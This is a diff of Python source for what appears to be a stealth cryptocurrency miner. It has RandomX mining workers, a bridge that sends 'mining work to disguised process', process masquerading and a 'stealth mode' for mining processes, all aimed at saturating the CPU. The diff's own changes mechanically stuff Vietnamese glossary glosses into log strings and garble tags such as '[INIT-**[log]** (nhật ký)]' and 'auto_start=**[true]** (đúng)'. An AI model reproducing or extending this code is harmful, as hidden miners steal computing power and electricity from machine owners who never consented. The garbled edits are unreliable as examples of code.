@@ -135,24 +135,24 @@ class ProcessCommunicationBridge:
                     name=f"mining_bridge_{process_pid}"
                 )
                 self.shared_memory_segments[process_pid] = shared_mem
-                self.logger.info(f"🧠 [IPC] Created shared memory segment for PID {process_pid}: {shared_mem.name}")
+                self.logger.info(f"🧠 [IPC] Created shared **[memory]** (bộ nhớ) segment for **[PID]** (Process ID - mã định danh tiến trình) {process_pid}: {shared_mem.name}")
             except Exception as shm_error:
-                self.logger.warning(f"⚠️ [IPC] Failed to create shared memory for PID {process_pid}: {shm_error}")
+                self.logger.warning(f"⚠️ [IPC] Failed to create shared **[memory]** (bộ nhớ) for **[PID]** (Process ID - mã định danh tiến trình) {process_pid}: {shm_error}")
                 # Continue without shared memory - use queues only
             
             self.active_bridges += 1
-            self.logger.info(f"✅ [IPC] Bridge created for process PID {process_pid} - Active bridges: {self.active_bridges}")
+            self.logger.info(f"✅ [IPC] Bridge created for **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình) {process_pid} - Active bridges: {self.active_bridges}")
             return True
             
         except Exception as e:
-            self.logger.error(f"❌ [IPC] Failed to create bridge for PID {process_pid}: {e}")
+            self.logger.error(f"❌ [IPC] Failed to create bridge for **[PID]** (Process ID - mã định danh tiến trình) {process_pid}: {e}")
             return False
     
     def send_work_batch(self, process_pid: int, work_data: Dict[str, Any]) -> bool:
         """**Send Work Batch** (gửi lô công việc) - send mining work to disguised process."""
         try:
             if process_pid not in self.message_queues:
-                self.logger.error(f"❌ [IPC] No bridge exists for PID {process_pid}")
+                self.logger.error(f"❌ [IPC] No bridge exists for **[PID]** (Process ID - mã định danh tiến trình) {process_pid}")
                 return False
             
             # Prepare work message
@@ -167,14 +167,14 @@ class ProcessCommunicationBridge:
             self.message_queues[process_pid].put(work_message, timeout=5.0)
             self.total_messages_sent += 1
             
-            self.logger.debug(f"📤 [IPC] Sent work batch to PID {process_pid}: {work_message['batch_id']}")
+            self.logger.debug(f"📤 [IPC] Sent work batch to **[PID]** (Process ID - mã định danh tiến trình) {process_pid}: {work_message['batch_id']}")
             return True
             
         except queue.Full:
-            self.logger.warning(f"⚠️ [IPC] Message queue full for PID {process_pid}")
+            self.logger.warning(f"⚠️ [IPC] Message **[queue]** (hàng đợi) full for **[PID]** (Process ID - mã định danh tiến trình) {process_pid}")
             return False
         except Exception as e:
-            self.logger.error(f"❌ [IPC] Failed to send work batch to PID {process_pid}: {e}")
+            self.logger.error(f"❌ [IPC] Failed to send work batch to **[PID]** (Process ID - mã định danh tiến trình) {process_pid}: {e}")
             return False
     
     def collect_results(self, timeout: float = 2.0) -> List[Dict[str, Any]]:
@@ -191,7 +191,7 @@ class ProcessCommunicationBridge:
             except queue.Empty:
                 continue
             except Exception as e:
-                self.logger.error(f"❌ [IPC] Error collecting results: {e}")
+                self.logger.error(f"❌ [IPC] **[error]** (lỗi) collecting results: {e}")
                 break
         
         if results:
@@ -231,16 +231,16 @@ class ProcessCommunicationBridge:
                     del self.shared_memory_segments[process_pid]
                     cleanup_count += 1
                 except Exception as shm_error:
-                    self.logger.debug(f"Warning: Shared memory cleanup error for PID {process_pid}: {shm_error}")
+                    self.logger.debug(f"**[warning]** (cảnh báo): Shared **[memory]** (bộ nhớ) cleanup **[error]** (lỗi) for **[PID]** (Process ID - mã định danh tiến trình) {process_pid}: {shm_error}")
             
             if cleanup_count > 0:
                 self.active_bridges -= 1
-                self.logger.info(f"🧹 [IPC] Bridge shutdown for PID {process_pid} - {cleanup_count} resources cleaned")
+                self.logger.info(f"🧹 [IPC] Bridge shutdown for **[PID]** (Process ID - mã định danh tiến trình) {process_pid} - {cleanup_count} resources cleaned")
             
             return True
             
         except Exception as e:
-            self.logger.error(f"❌ [IPC] Error shutting down bridge for PID {process_pid}: {e}")
+            self.logger.error(f"❌ [IPC] **[error]** (lỗi) shutting down bridge for **[PID]** (Process ID - mã định danh tiến trình) {process_pid}: {e}")
             return False
     
     def cleanup_all_bridges(self) -> bool:
@@ -263,7 +263,7 @@ class ProcessCommunicationBridge:
             return True
             
         except Exception as e:
-            self.logger.error(f"❌ [IPC] Error during bridge cleanup: {e}")
+            self.logger.error(f"❌ [IPC] **[error]** (lỗi) during bridge cleanup: {e}")
             return False
     
     def create_masquerading_wrapper(self, 
@@ -484,14 +484,14 @@ if __name__ == "__main__":
                     'name': process_name
                 }
                 
-                self.logger.info(f"✅ [MASQUERADE] Started process PID {process.pid}")
+                self.logger.info(f"✅ [MASQUERADE] Started **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình) {process.pid}")
                 return process.pid
             else:
-                self.logger.error(f"❌ [MASQUERADE] Process failed to start")
+                self.logger.error(f"❌ [MASQUERADE] **[process]** (tiến trình) failed to start")
                 return None
                 
         except Exception as e:
-            self.logger.error(f"❌ [MASQUERADE] Error starting process: {e}")
+            self.logger.error(f"❌ [MASQUERADE] **[error]** (lỗi) starting **[process]** (tiến trình): {e}")
             return None
     
     def get_masquerading_status(self) -> Dict:
@@ -567,63 +567,63 @@ class MiningIntegrationAdapter:
         """
         try:
             # 🔧 Process-level initialization logging
-            self.logger.info(f"[INIT-LOG] Initializing optimized mining - Process PID: {os.getpid()}")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] Initializing optimized mining - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
             
             if self.is_initialized:
-                self.logger.warning(f"[INIT-LOG] Optimized mining already initialized - Process PID: {os.getpid()}")
+                self.logger.warning(f"[INIT-**[log]** (nhật ký)] Optimized mining already initialized - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
                 return True
             
-            self.logger.info(f"[INIT-LOG] Initializing optimized mining system for {cores} cores - Process PID: {os.getpid()}")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] Initializing optimized mining system for {cores} cores - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
             
             # Generate optimized configuration
             if not config:
-                self.logger.info(f"[INIT-LOG] Generating optimized configuration...")
+                self.logger.info(f"[INIT-**[log]** (nhật ký)] Generating optimized **[configuration]** (cấu hình)...")
                 config = self.config_generator.generate_mining_config(
                     performance_profile='optimized', 
                     use_optimized_chain=True
                 )
-                self.logger.info(f"[INIT-LOG] Configuration generated: {config}")
+                self.logger.info(f"[INIT-**[log]** (nhật ký)] **[configuration]** (cấu hình) generated: {config}")
             
             # ✅ STEALTH REFACTOR: Stealth initialization moved to centralized StealthActivationManager
             # External stealth will be activated via EventBus after PID registration
             if enable_stealth:
-                self.logger.info(f"[INIT-LOG] Stealth mode will be activated via EventBus after PID registration")
+                self.logger.info(f"[INIT-**[log]** (nhật ký)] Stealth mode will be activated via EventBus after **[PID]** (Process ID - mã định danh tiến trình) registration")
             else:
-                self.logger.info(f"[INIT-LOG] Stealth mode disabled by configuration")
+                self.logger.info(f"[INIT-**[log]** (nhật ký)] Stealth mode disabled by **[configuration]** (cấu hình)")
             
             # ✅ IPC INTEGRATION: Initialize ProcessCommunicationBridge for stealth processes
             if enable_stealth:
                 try:
                     self.communication_bridge = ProcessCommunicationBridge(logger=self.logger)
-                    self.logger.info(f"[INIT-LOG] ✅ ProcessCommunicationBridge initialized")
+                    self.logger.info(f"[INIT-**[log]** (nhật ký)] ✅ ProcessCommunicationBridge initialized")
                 except Exception as bridge_error:
-                    self.logger.warning(f"[INIT-LOG] ⚠️ Failed to initialize communication bridge: {bridge_error}")
+                    self.logger.warning(f"[INIT-**[log]** (nhật ký)] ⚠️ Failed to initialize communication bridge: {bridge_error}")
                     self.communication_bridge = None
 
             # 🔧 Initialize core components với process logging
-            self.logger.info(f"[INIT-LOG] Creating calculation chain for {cores} cores...")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] Creating calculation chain for {cores} cores...")
             self.calculation_chain = create_optimized_mining_chain(cores=cores, logger=self.logger)
             if not self.calculation_chain:
                 raise RuntimeError("Failed to create calculation chain")
-            self.logger.info(f"[INIT-LOG] ✅ Calculation chain created")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] ✅ Calculation chain created")
             
             # ✅ STEALTH REFACTOR: Process stealth will be activated via EventBus
             # Main mining process stealth activation moved to centralized system
             
-            self.logger.info(f"[INIT-LOG] Creating workload distributor...")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] Creating workload distributor...")
             self.workload_distributor = create_balanced_distributor(cores=cores, logger=self.logger)
             if not self.workload_distributor:
                 raise RuntimeError("Failed to create workload distributor")
-            self.logger.info(f"[INIT-LOG] ✅ Workload distributor created")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] ✅ Workload distributor created")
             
-            self.logger.info(f"[INIT-LOG] Creating synchronization component...")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] Creating synchronization component...")
             self.synchronization = create_high_performance_sync(cores=cores, logger=self.logger)
             if not self.synchronization:
                 raise RuntimeError("Failed to create synchronization component")
-            self.logger.info(f"[INIT-LOG] ✅ Synchronization component created")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] ✅ Synchronization component created")
             
             # Register RandomX task profile
-            self.logger.info(f"[INIT-LOG] Registering RandomX task profile...")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] Registering RandomX task profile...")
             randomx_profile = TaskProfile(
                 task_type="randomx_mining",
                 estimated_complexity=1.2,
@@ -631,40 +631,40 @@ class MiningIntegrationAdapter:
                 parallel_efficiency=0.98  # Excellent parallel efficiency
             )
             self.workload_distributor.register_task_profile("randomx_mining", randomx_profile)
-            self.logger.info(f"[INIT-LOG] ✅ RandomX task profile registered")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] ✅ RandomX task profile registered")
             
             # Initialize calculation chain worker pool
-            self.logger.info(f"[INIT-LOG] Initializing worker pool...")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] Initializing worker pool...")
             if not self.calculation_chain.initialize_worker_pool():
                 raise RuntimeError("Failed to initialize worker pool")
-            self.logger.info(f"[INIT-LOG] ✅ Worker pool initialized")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] ✅ Worker pool initialized")
             
             # Start workload distributor
-            self.logger.info(f"[INIT-LOG] Starting workload distributor...")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] Starting workload distributor...")
             self.workload_distributor.start()
-            self.logger.info(f"[INIT-LOG] ✅ Workload distributor started")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] ✅ Workload distributor started")
             
             # 🔧 Verify component initialization
             if hasattr(self.calculation_chain, 'get_performance_stats'):
                 try:
                     init_stats = self.calculation_chain.get_performance_stats()
-                    self.logger.info(f"[INIT-LOG] Initial performance stats: {init_stats}")
+                    self.logger.info(f"[INIT-**[log]** (nhật ký)] Initial performance stats: {init_stats}")
                 except Exception as stats_error:
-                    self.logger.warning(f"[INIT-LOG] Could not get initial stats: {stats_error}")
+                    self.logger.warning(f"[INIT-**[log]** (nhật ký)] Could not get initial stats: {stats_error}")
             
             self.is_initialized = True
             self.legacy_process_replacement = True
 
             # 🚀 Auto-start mining session nếu auto_start=True
             if auto_start and not self.is_running:
-                self.logger.info("[INIT-LOG] Auto-starting mining session (auto_start=True)")
+                self.logger.info("[INIT-**[log]** (nhật ký)] Auto-starting mining session (auto_start=**[true]** (đúng))")
                 self.start_mining_session()
 
-            self.logger.info(f"[INIT-LOG] ✅ Optimized mining system initialized successfully - Process PID: {os.getpid()}")
+            self.logger.info(f"[INIT-**[log]** (nhật ký)] ✅ Optimized mining system initialized successfully - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
             return True
             
         except Exception as e:
-            self.logger.error(f"[INIT-LOG] ❌ Failed to initialize optimized mining: {e}")
+            self.logger.error(f"[INIT-**[log]** (nhật ký)] ❌ Failed to initialize optimized mining: {e}")
             self.cleanup()
             return False
     
@@ -675,16 +675,16 @@ class MiningIntegrationAdapter:
         """
         try:
             # 🔧 Process-level session startup logging
-            self.logger.info(f"[SESSION-LOG] Starting mining session - Process PID: {os.getpid()}")
+            self.logger.info(f"[SESSION-**[log]** (nhật ký)] Starting mining session - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
             
             if not self.is_initialized:
-                self.logger.info(f"[SESSION-LOG] System not initialized, initializing...")
+                self.logger.info(f"[SESSION-**[log]** (nhật ký)] System not initialized, initializing...")
                 if not self.initialize_optimized_mining():
-                    self.logger.error(f"[SESSION-LOG] Failed to initialize optimized mining")
+                    self.logger.error(f"[SESSION-**[log]** (nhật ký)] Failed to initialize optimized mining")
                     return False
             
             if self.is_running:
-                self.logger.warning(f"[SESSION-LOG] Mining session already running - Process PID: {os.getpid()}")
+                self.logger.warning(f"[SESSION-**[log]** (nhật ký)] Mining session already running - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
                 return True
             
             # Use default config if none provided
@@ -695,7 +695,7 @@ class MiningIntegrationAdapter:
                            f"total_iterations={self.current_session.total_iterations}")
             
             # 🔧 Process-level thread startup logging
-            self.logger.info(f"[SESSION-LOG] Starting monitoring and workload threads...")
+            self.logger.info(f"[SESSION-**[log]** (nhật ký)] Starting monitoring and workload threads...")
             
             # Start monitoring
             self.shutdown_event.clear()
@@ -705,7 +705,7 @@ class MiningIntegrationAdapter:
                 name=f"MiningMonitor-{os.getpid()}"
             )
             self.monitoring_thread.start()
-            self.logger.info(f"[SESSION-LOG] Luồng giám sát (monitoring thread) đã khởi động: {self.monitoring_thread.name}")
+            self.logger.info(f"[SESSION-**[log]** (nhật ký)] Luồng giám sát (monitoring **[thread]** (luồng)) đã khởi động: {self.monitoring_thread.name}")
             
             # Start workload management
             self.workload_thread = threading.Thread(
@@ -714,7 +714,7 @@ class MiningIntegrationAdapter:
                 name=f"WorkloadManager-{os.getpid()}"
             )
             self.workload_thread.start()
-            self.logger.info(f"[SESSION-LOG] Luồng tải công việc (workload thread) đã khởi động: {self.workload_thread.name}")
+            self.logger.info(f"[SESSION-**[log]** (nhật ký)] Luồng tải công việc (workload **[thread]** (luồng)) đã khởi động: {self.workload_thread.name}")
             
             # 🔧 Verify thread startup
             time.sleep(0.5)  # Short wait for threads to initialize
@@ -722,27 +722,27 @@ class MiningIntegrationAdapter:
             monitor_alive = self.monitoring_thread.is_alive()
             workload_alive = self.workload_thread.is_alive()
             
-            self.logger.info(f"[SESSION-LOG] Thread status: Monitor={monitor_alive}, Workload={workload_alive}")
+            self.logger.info(f"[SESSION-**[log]** (nhật ký)] **[thread]** (luồng) status: Monitor={monitor_alive}, Workload={workload_alive}")
             
             if not monitor_alive or not workload_alive:
-                self.logger.error(f"[SESSION-LOG] Thread startup failed - Monitor: {monitor_alive}, Workload: {workload_alive}")
+                self.logger.error(f"[SESSION-**[log]** (nhật ký)] **[thread]** (luồng) startup failed - Monitor: {monitor_alive}, Workload: {workload_alive}")
                 return False
             
             self.is_running = True
-            self.logger.info(f"[SESSION-LOG] ✅ Phiên khai thác đã khởi động thành công - Process PID: {os.getpid()}")
+            self.logger.info(f"[SESSION-**[log]** (nhật ký)] ✅ Phiên khai thác đã khởi động thành công - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
             
             # 🔧 Initial worker status check
             if hasattr(self.calculation_chain, 'get_performance_stats'):
                 try:
                     initial_stats = self.calculation_chain.get_performance_stats()
-                    self.logger.info(f"[SESSION-LOG] Initial worker stats: {initial_stats}")
+                    self.logger.info(f"[SESSION-**[log]** (nhật ký)] Initial worker stats: {initial_stats}")
                 except Exception as stats_error:
-                    self.logger.warning(f"[SESSION-LOG] Could not get initial worker stats: {stats_error}")
+                    self.logger.warning(f"[SESSION-**[log]** (nhật ký)] Could not get initial worker stats: {stats_error}")
             
             return True
             
         except Exception as e:
-            self.logger.error(f"[SESSION-LOG] Failed to start mining session: {e}")
+            self.logger.error(f"[SESSION-**[log]** (nhật ký)] Failed to start mining session: {e}")
             return False
     
     def stop_mining_session(self) -> bool:
@@ -773,7 +773,7 @@ class MiningIntegrationAdapter:
             return True
             
         except Exception as e:
-            self.logger.error(f"Error stopping mining session: {e}")
+            self.logger.error(f"**[error]** (lỗi) stopping mining session: {e}")
             return False
     
     def apply_throttling(self, throttle_percentage: float) -> bool:
@@ -793,7 +793,7 @@ class MiningIntegrationAdapter:
                     try:
                         self.calculation_chain.on_throttle_change(throttle_percentage)
                     except Exception as cb_err:
-                        self.logger.warning(f"on_throttle_change callback error: {cb_err}")
+                        self.logger.warning(f"on_throttle_change callback **[error]** (lỗi): {cb_err}")
                 self.logger.info(f"Applied {throttle_percentage}% throttling to optimized mining")
             return success
             
@@ -812,7 +812,7 @@ class MiningIntegrationAdapter:
             bool: True if successfully registered, False otherwise
         """
         try:
-            self.logger.info(f"📝 Registering external process PID={pid} with mining adapter")
+            self.logger.info(f"📝 Registering external **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid} with mining adapter")
             
             # Store external process PID for monitoring
             if not hasattr(self, 'external_processes'):
@@ -822,21 +822,21 @@ class MiningIntegrationAdapter:
             
             # ✅ STEALTH REFACTOR: External process stealth will be activated via EventBus
             # after PID registration. Stealth activation moved to centralized system.
-            self.logger.info(f"📝 [STEALTH] External process PID={pid} stealth will be activated via EventBus")
+            self.logger.info(f"📝 [STEALTH] External **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid} stealth will be activated via EventBus")
             
             # Enable monitoring for external process
             if self.workload_distributor:
                 try:
                     self.workload_distributor.register_external_process(pid)
-                    self.logger.info(f"✅ Registered PID={pid} with workload distributor")
+                    self.logger.info(f"✅ Registered **[PID]** (Process ID - mã định danh tiến trình)={pid} with workload distributor")
                 except Exception as e:
-                    self.logger.warning(f"Failed to register PID with workload distributor: {e}")
+                    self.logger.warning(f"Failed to register **[PID]** (Process ID - mã định danh tiến trình) with workload distributor: {e}")
             
-            self.logger.info(f"🎯 Successfully registered external process PID={pid}")
+            self.logger.info(f"🎯 Successfully registered external **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid}")
             return True
             
         except Exception as e:
-            self.logger.error(f"❌ Failed to register external process PID={pid}: {e}")
+            self.logger.error(f"❌ Failed to register external **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def get_performance_metrics(self) -> Optional[PerformanceMetrics]:
@@ -874,7 +874,7 @@ class MiningIntegrationAdapter:
             return metrics
             
         except Exception as e:
-            self.logger.error(f"Error getting performance metrics: {e}")
+            self.logger.error(f"**[error]** (lỗi) getting performance metrics: {e}")
             return None
     
     def _monitoring_loop(self):
@@ -882,14 +882,14 @@ class MiningIntegrationAdapter:
         monitor_count = 0
         
         # 🔧 Process-level monitoring initialization
-        self.logger.info(f"[MONITOR-LOG] Starting monitoring loop - PID: {os.getpid()}")
+        self.logger.info(f"[MONITOR-**[log]** (nhật ký)] Starting monitoring loop - **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
         
         while not self.shutdown_event.is_set():
             try:
                 monitor_count += 1
                 
                 # 🔧 Process-level monitoring logging
-                self.logger.debug(f"[MONITOR-LOG] Monitor cycle {monitor_count} - PID: {os.getpid()}")
+                self.logger.debug(f"[MONITOR-**[log]** (nhật ký)] Monitor cycle {monitor_count} - **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
                 
                 # Get current metrics
                 metrics = self.get_performance_metrics()
@@ -901,58 +901,58 @@ class MiningIntegrationAdapter:
                     
                     # 🔧 Process-level performance issue detection
                     if metrics.total_cpu_utilization < 600:  # Below 75% of 800% target
-                        self.logger.warning(f"[MONITOR-LOG] ⚠️ Low CPU utilization: {metrics.total_cpu_utilization:.1f}% - Process PID: {os.getpid()}")
+                        self.logger.warning(f"[MONITOR-**[log]** (nhật ký)] ⚠️ Low **[CPU]** (bộ xử lý trung tâm) utilization: {metrics.total_cpu_utilization:.1f}% - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
                         
                         # Additional diagnostic logging
                         if hasattr(self.calculation_chain, 'get_worker_status'):
                             worker_status = self.calculation_chain.get_worker_status()
-                            self.logger.warning(f"[MONITOR-LOG] Worker status: {worker_status}")
+                            self.logger.warning(f"[MONITOR-**[log]** (nhật ký)] Worker status: {worker_status}")
                     
                     if metrics.active_workers < self.calculation_chain.cores:
-                        self.logger.warning(f"[MONITOR-LOG] ⚠️ Some workers inactive: {metrics.active_workers}/{self.calculation_chain.cores} - Process PID: {os.getpid()}")
+                        self.logger.warning(f"[MONITOR-**[log]** (nhật ký)] ⚠️ Some workers inactive: {metrics.active_workers}/{self.calculation_chain.cores} - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
                         
                         # Try to diagnose worker communication issues
                         try:
                             stats = self.calculation_chain.get_performance_stats()
-                            self.logger.warning(f"[MONITOR-LOG] Worker details: {stats}")
+                            self.logger.warning(f"[MONITOR-**[log]** (nhật ký)] Worker details: {stats}")
                         except Exception as stats_error:
-                            self.logger.error(f"[MONITOR-LOG] Error getting worker stats: {stats_error}")
+                            self.logger.error(f"[MONITOR-**[log]** (nhật ký)] **[error]** (lỗi) getting worker stats: {stats_error}")
                     
                     # 🔧 Hash rate zero detection
                     if metrics.hashrate == 0.0:
-                        self.logger.error(f"[MONITOR-LOG] 🔴 HASH RATE ZERO DETECTED - Process PID: {os.getpid()}")
-                        self.logger.error(f"[MONITOR-LOG] Tasks completed: {metrics.tasks_completed}, Active workers: {metrics.active_workers}")
+                        self.logger.error(f"[MONITOR-**[log]** (nhật ký)] 🔴 HASH RATE ZERO DETECTED - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
+                        self.logger.error(f"[MONITOR-**[log]** (nhật ký)] Tasks completed: {metrics.tasks_completed}, Active workers: {metrics.active_workers}")
                         
                         # Enhanced diagnostic information
                         if hasattr(self.calculation_chain, 'diagnose_workers'):
                             diagnosis = self.calculation_chain.diagnose_workers()
-                            self.logger.error(f"[MONITOR-LOG] Worker diagnosis: {diagnosis}")
+                            self.logger.error(f"[MONITOR-**[log]** (nhật ký)] Worker diagnosis: {diagnosis}")
                     
                     # 🔧 Worker communication health check
                     if metrics.active_workers > 0 and metrics.hashrate > 0:
-                        self.logger.debug(f"[MONITOR-LOG] ✅ Worker communication healthy - {metrics.active_workers} workers producing {metrics.hashrate:.2f} H/s")
+                        self.logger.debug(f"[MONITOR-**[log]** (nhật ký)] ✅ Worker communication healthy - {metrics.active_workers} workers producing {metrics.hashrate:.2f} H/s")
                 else:
                     # 🔧 No metrics available logging
-                    self.logger.warning(f"[MONITOR-LOG] ❌ No performance metrics available - Process PID: {os.getpid()}")
+                    self.logger.warning(f"[MONITOR-**[log]** (nhật ký)] ❌ No performance metrics available - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
                     
                     # Try to diagnose why metrics are unavailable
                     if not self.calculation_chain:
-                        self.logger.error(f"[MONITOR-LOG] Calculation chain not initialized")
+                        self.logger.error(f"[MONITOR-**[log]** (nhật ký)] Calculation chain not initialized")
                     elif not self.workload_distributor:
-                        self.logger.error(f"[MONITOR-LOG] Workload distributor not initialized")
+                        self.logger.error(f"[MONITOR-**[log]** (nhật ký)] Workload distributor not initialized")
                     else:
-                        self.logger.error(f"[MONITOR-LOG] Components initialized but metrics unavailable")
+                        self.logger.error(f"[MONITOR-**[log]** (nhật ký)] Components initialized but metrics unavailable")
                 
                 # Wait for next monitoring interval
                 interval = self.current_session.monitoring_interval if self.current_session else 5.0
-                self.logger.debug(f"[MONITOR-LOG] Waiting {interval}s for next monitoring cycle")
+                self.logger.debug(f"[MONITOR-**[log]** (nhật ký)] Waiting {interval}s for next monitoring cycle")
                 self.shutdown_event.wait(interval)
                 
             except Exception as e:
-                self.logger.error(f"[MONITOR-LOG] Monitoring loop error in cycle {monitor_count}: {e}")
+                self.logger.error(f"[MONITOR-**[log]** (nhật ký)] Monitoring loop **[error]** (lỗi) in cycle {monitor_count}: {e}")
                 self.shutdown_event.wait(5.0)
         
-        self.logger.info(f"[MONITOR-LOG] Monitoring loop terminated - Total cycles: {monitor_count}")
+        self.logger.info(f"[MONITOR-**[log]** (nhật ký)] Monitoring loop terminated - Total cycles: {monitor_count}")
     
     def _workload_management_loop(self):
         """
@@ -964,20 +964,20 @@ class MiningIntegrationAdapter:
         last_hash_rate_report = time.time()
         
         # 🔧 Detailed process logging để track subprocess execution
-        self.logger.info(f"[PROCESS-LOG] Starting workload management loop - PID: {os.getpid()}")
-        self.logger.info(f"[PROCESS-LOG] Worker pool cores: {self.calculation_chain.cores if self.calculation_chain else 'N/A'}")
+        self.logger.info(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Starting workload management loop - **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
+        self.logger.info(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Worker pool cores: {self.calculation_chain.cores if self.calculation_chain else 'N/A'}")
         
         while not self.shutdown_event.is_set():
             try:
                 if not self.current_session:
-                    self.logger.warning(f"[PROCESS-LOG] No current session - breaking loop")
+                    self.logger.warning(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] No current session - breaking loop")
                     break
                 
                 batch_counter += 1
                 batch_start_time = time.time()
                 
                 # 🔧 Process-level logging cho batch submission
-                self.logger.info(f"[PROCESS-LOG] Batch {batch_counter} starting - Process PID: {os.getpid()}")
+                self.logger.info(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Batch {batch_counter} starting - **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình): {os.getpid()}")
                 
                 # Submit multiple overlapping workloads để maintain CPU saturation
                 submitted_tasks = []
@@ -989,16 +989,16 @@ class MiningIntegrationAdapter:
                             total_iterations=workload_size
                         )
                         submitted_tasks.append(task_id)
-                        self.logger.info(f"[PROCESS-LOG] Submitted enhanced workload {task_id}: {workload_size} iterations to {self.calculation_chain.cores} cores")
+                        self.logger.info(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Submitted enhanced workload {task_id}: {workload_size} iterations to {self.calculation_chain.cores} cores")
                         
                         # Brief delay between submissions để prevent queue overflow
                         time.sleep(0.1)
                         
                     except Exception as submit_error:
-                        self.logger.error(f"[PROCESS-LOG] Failed to submit workload {i}: {submit_error}")
+                        self.logger.error(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Failed to submit workload {i}: {submit_error}")
                 
                 if not submitted_tasks:
-                    self.logger.error(f"[PROCESS-LOG] No workloads submitted in batch {batch_counter}")
+                    self.logger.error(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] No workloads submitted in batch {batch_counter}")
                     consecutive_empty_results += 1
                     self.shutdown_event.wait(1.0)
                     continue
@@ -1018,7 +1018,7 @@ class MiningIntegrationAdapter:
                             
                             # 🔧 Process-level result logging
                             for result in results:
-                                self.logger.debug(f"[PROCESS-LOG] Core {result.core_id}: {result.iterations_completed} iterations in {result.computation_time:.3f}s, CPU: {result.cpu_utilization:.1f}%")
+                                self.logger.debug(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Core {result.core_id}: {result.iterations_completed} iterations in {result.computation_time:.3f}s, **[CPU]** (bộ xử lý trung tâm): {result.cpu_utilization:.1f}%")
                                 
                                 # Update distributor với task completion times
                                 if self.workload_distributor:
@@ -1031,15 +1031,15 @@ class MiningIntegrationAdapter:
                             consecutive_empty_results += 1
                             # 🔧 Log empty result cycles với process context
                             if consecutive_empty_results <= 3:
-                                self.logger.debug(f"[PROCESS-LOG] Empty result cycle {consecutive_empty_results} - waiting for workers")
+                                self.logger.debug(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Empty result cycle {consecutive_empty_results} - waiting for workers")
                             elif consecutive_empty_results == 8:
-                                self.logger.warning(f"[PROCESS-LOG] Multiple empty result cycles ({consecutive_empty_results}) - checking worker health")
+                                self.logger.warning(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Multiple empty result cycles ({consecutive_empty_results}) - checking worker health")
                             
                             if consecutive_empty_results > 10:
-                                self.logger.error(f"[PROCESS-LOG] Too many empty result cycles ({consecutive_empty_results}) - worker communication failure")
+                                self.logger.error(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Too many empty result cycles ({consecutive_empty_results}) - worker communication failure")
                                 break
                     except Exception as result_error:
-                        self.logger.error(f"[PROCESS-LOG] Error getting results: {result_error}")
+                        self.logger.error(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] **[error]** (lỗi) getting results: {result_error}")
                         consecutive_empty_results += 1
                 
                 # 🔧 Detailed batch completion logging
@@ -1059,7 +1059,7 @@ class MiningIntegrationAdapter:
                         last_hash_rate_report = time.time()
                         
                 else:
-                    self.logger.warning(f"[PROCESS-LOG] ❌ Batch {batch_counter} FAILED: No results received")
+                    self.logger.warning(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] ❌ Batch {batch_counter} FAILED: No results received")
                     
                     # 🔧 Enhanced worker health check với process logging
                     try:
@@ -1067,18 +1067,18 @@ class MiningIntegrationAdapter:
                         active_workers = stats.get('active_workers', 0)
                         total_workers = self.calculation_chain.cores
                         
-                        self.logger.error(f"[PROCESS-LOG] Worker status: {active_workers}/{total_workers} active")
+                        self.logger.error(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Worker status: {active_workers}/{total_workers} active")
                         
                         if active_workers < total_workers:
-                            self.logger.error(f"[PROCESS-LOG] CRITICAL: Only {active_workers}/{total_workers} workers active - potential communication failure")
+                            self.logger.error(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] CRITICAL: Only {active_workers}/{total_workers} workers active - potential communication failure")
                             
                             # Force worker restart attempt
